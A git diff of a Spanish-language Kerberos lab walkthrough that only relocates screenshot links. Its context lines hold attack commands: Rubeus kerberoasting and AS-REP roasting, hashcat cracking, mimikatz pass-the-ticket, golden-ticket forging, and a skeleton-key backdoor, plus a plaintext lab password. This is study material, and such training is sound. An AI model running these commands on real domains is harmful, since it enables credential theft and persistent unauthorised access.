@@ -189,7 +189,7 @@ controller\administrator
 *Evil-WinRM* PS C:\Users\Administrator\Downloads> .\Rubeus.exe harvest /interval:30
 ```
 
-![alt text](image.png)
+![alt text](img/image.png)
 
 Agregamos el dominio al hosts de windows
 
@@ -257,7 +257,7 @@ xfreerdp /u:Administrator /p:'P@$$W0rd' /v:10.201.29.113 /d:CONTROLLER.local /ce
 .\Rubeus.exe kerberoast
 ```
 
-![alt text](image-1.png)
+![alt text](img/image-1.png)
 
 Guardamos el Hash generado con Rubeus.
 
@@ -278,7 +278,7 @@ Crack de contraseñas
 hashcat -m 13100 -a 0 hash.txt  passwords.txt
 ```
 
-![alt text](image-2.png)
+![alt text](img/image-2.png)
 
 Agregamos nuestra nueva contraseña 
 
@@ -299,7 +299,7 @@ Crack del http service
 hashcat -m 13100 -a 0 hash_http_service.txt passwords.txt ****
 ```
 
-![alt text](image-3.png)
+![alt text](img/image-3.png)
 
 
 | User | Password |
@@ -315,7 +315,7 @@ hashcat -m 13100 -a 0 hash_http_service.txt passwords.txt ****
 .\Rubeus.exe asreproast
 ```
 
-![alt text](image-4.png)
+![alt text](img/image-4.png)
 
 Guardamos nuestros nuevos hash encontrados.
 
@@ -333,13 +333,13 @@ Crack de los Hash
 hashcat -m 18200 -a 0 hash_admin2.txt passwords.txt  
 ```
 
-![alt text](image-5.png)
+![alt text](img/image-5.png)
 
 ```bash
 hashcat -m 18200 -a 0 hash_user3.txt passwords.txt
 ```
 
-![alt text](image-6.png)
+![alt text](img/image-6.png)
 
 | User | Password |
 | --- | --- |
@@ -359,23 +359,23 @@ mimikatz # privilege::debug
 mimikatz # sekurlsa::tickets /export
 ```
 
-![alt text](image-7.png)
+![alt text](img/image-7.png)
 
-![alt text](image-8.png)
+![alt text](img/image-8.png)
 
 ```shell
 mimikatz # kerberos::ptt [0;7fbb3]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
 ```
 
-![alt text](image-9.png)
+![alt text](img/image-9.png)
 
-![alt text](image-10.png)
+![alt text](img/image-10.png)
 
 ```powershell
 dir \\10.201.99.85\admin$
 ```
 
-![alt text](image-11.png)
+![alt text](img/image-11.png)
 
 Golden/Silver Ticket Attacks w/ mimikatz
 
@@ -387,7 +387,7 @@ privilege::debug
 lsadump::lsa /inject /name:krbtgt
 ```
 
-![alt text](image-12.png)
+![alt text](img/image-12.png)
 
 Guardamos el SID y el NTLM
 
@@ -400,13 +400,13 @@ Guardamos el SID y el NTLM
 kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
 ```
 
-![alt text](image-13.png)
+![alt text](img/image-13.png)
 
 ```powershell
 misc::cmd
 ```
 
-![alt text](image-14.png)
+![alt text](img/image-14.png)
 
 ```powershell
 lsadump::lsa /inject /name:administrator
@@ -418,15 +418,15 @@ Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860
 NTLM : cd40c9ed96265531b21fc5b1dafcfb0a
 ```
 
-![alt text](image-15.png)
+![alt text](img/image-15.png)
 
-![alt text](image-16.png)
+![alt text](img/image-16.png)
 
 ```powershell
 kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:2777b7fec870e04dda00cd7260f7bee6 /id:500
 ```
 
-![alt text](image-17.png)
+![alt text](img/image-17.png)
 
 Kerberos Backdoors w/ mimikatz
 
@@ -438,7 +438,7 @@ privilege::debug
 misc::skeleton
 ```
 
-![alt text](image-18.png)
+![alt text](img/image-18.png)
 
 Accessing the forest - 
 
